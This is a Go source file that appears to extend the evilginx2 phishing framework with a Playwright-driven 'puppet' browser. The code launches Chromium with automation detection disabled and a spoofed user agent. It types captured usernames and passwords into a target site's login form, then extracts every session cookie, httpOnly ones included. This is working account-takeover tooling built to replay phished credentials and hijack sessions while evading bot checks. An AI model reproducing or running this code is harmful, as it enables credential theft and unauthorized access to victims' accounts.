package core

import (
	"strings"

	"github.com/kgretzky/evilginx2/log"
	"github.com/playwright-community/playwright-go"
)

// Internal global instance
var puppetInstance *Puppet

type Puppet struct {
	pw      *playwright.Playwright
	browser playwright.Browser
}

// InitPuppet initializes the Playwright instance and browser
func InitPuppet() error {
	if puppetInstance != nil {
		return nil
	}

	log.Info("puppet: installing playwright...")
	// Install playwright driver and browsers if needed
	err := playwright.Install()
	if err != nil {
		log.Error("puppet: failed to install playwright: %v", err)
		return err
	}

	pw, err := playwright.Run()
	if err != nil {
		return err
	}

	// Launch browser (chromium)
	log.Info("puppet: launching browser...")
	browser, err := pw.Chromium.Launch(playwright.BrowserTypeLaunchOptions{
		Headless: playwright.Bool(false), // Visible browser as requested
		Args: []string{
			"--disable-blink-features=AutomationControlled",
			"--no-sandbox",
			"--disable-setuid-sandbox",
			"--disable-dev-shm-usage",
			"--disable-gpu",
			"--window-size=1280,720",
		},
	})
	if err != nil {
		return err
	}

	puppetInstance = &Puppet{
		pw:      pw,
		browser: browser,
	}
	return nil
}

// RunPuppetAutomation executes the automation flow for a given trigger
func RunPuppetAutomation(trigger *PuppetTrigger, credentials map[string]string) ([]map[string]interface{}, error) {
	if puppetInstance == nil {
		if err := InitPuppet(); err != nil {
			return nil, err
		}
	}

	log.Info("[PUPPET] Launching automation for trigger...")

	context, err := puppetInstance.browser.NewContext(playwright.BrowserNewContextOptions{
		Viewport:   &playwright.Size{Width: 1280, Height: 720},
		UserAgent:  playwright.String("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"),
		Locale:     playwright.String("en-US"),
		TimezoneId: playwright.String("America/New_York"),
	})
	if err != nil {
		return nil, err
	}
	defer context.Close()

	page, err := context.NewPage()
	if err != nil {
		return nil, err
	}

	if trigger.OpenUrl != "" {
		log.Info("[PUPPET] Navigating to %s", trigger.OpenUrl)
		_, err = page.Goto(trigger.OpenUrl, playwright.PageGotoOptions{
			WaitUntil: playwright.WaitUntilStateNetworkidle,
			Timeout:   playwright.Float(30000),
		})
		if err != nil {
			log.Error("[PUPPET] Navigation error: %v", err)
		}
	}

	// Execute Actions
	for i, action := range trigger.Actions {
		log.Debug("[PUPPET] Action [%d]: %s", i, action.Selector)
		
		// Variable substitution
		val := action.Value
		val = strings.ReplaceAll(val, "{username}", credentials["username"])
		val = strings.ReplaceAll(val, "{password}", credentials["password"])

		// Wait for selector
		if action.Selector != "" {
			tryCount := 0
			for tryCount < 3 {
				_, err := page.WaitForSelector(action.Selector, playwright.PageWaitForSelectorOptions{Timeout: playwright.Float(5000)})
				if err == nil {
					break
				}
				tryCount++
				page.WaitForTimeout(1000)
			}
		}

		if action.Value != "" {
			log.Debug("[PUPPET] Filling %s", action.Selector)
			page.Fill(action.Selector, val)
		}

		if action.Click {
			log.Debug("[PUPPET] Clicking %s", action.Selector)
			page.Click(action.Selector)
		}
		
		if action.Enter {
			log.Debug("[PUPPET] Pressing Enter on %s", action.Selector)
			page.Press(action.Selector, "Enter")
		}

		if action.PostWait > 0 {
			log.Debug("[PUPPET] Waiting %d ms", action.PostWait)
			page.WaitForTimeout(float64(action.PostWait))
		}
	}

	// Wait a bit final
	page.WaitForTimeout(2000)

	// Extract cookies
	cookies, err := context.Cookies()
	if err != nil {
		return nil, err
	}

	var cookieList []map[string]interface{}
	for _, c := range cookies {
		cookieList = append(cookieList, map[string]interface{}{
			"name":     c.Name,
			"value":    c.Value,
			"domain":   c.Domain,
			"path":     c.Path,
			"expires":  c.Expires,
			"httpOnly": c.HttpOnly,
			"secure":   c.Secure,
			"sameSite": c.SameSite,
		})
	}

	log.Info("[PUPPET] Extracted %d cookies", len(cookies))
	return cookieList, nil
}

// ClosePuppet cleans up
func ClosePuppet() {
	if puppetInstance != nil {
		if puppetInstance.browser != nil {
			puppetInstance.browser.Close()
		}
		if puppetInstance.pw != nil {
			puppetInstance.pw.Stop()
		}
		puppetInstance = nil
	}
}

type PuppetAction struct {
	Selector string `mapstructure:"selector"`
	Value    string `mapstructure:"value"`
	Enter    bool   `mapstructure:"enter"`
	Click    bool   `mapstructure:"click"`
	PostWait int    `mapstructure:"post_wait"`
}

type PuppetTrigger struct {
	Domains []string       `mapstructure:"domains"`
	Paths   []string       `mapstructure:"paths"`
	Token   string         `mapstructure:"token"`
	OpenUrl string         `mapstructure:"open_url"`
	Actions []PuppetAction `mapstructure:"actions"`
}

type PuppetConfig struct {
	Triggers []PuppetTrigger `mapstructure:"triggers"`
}
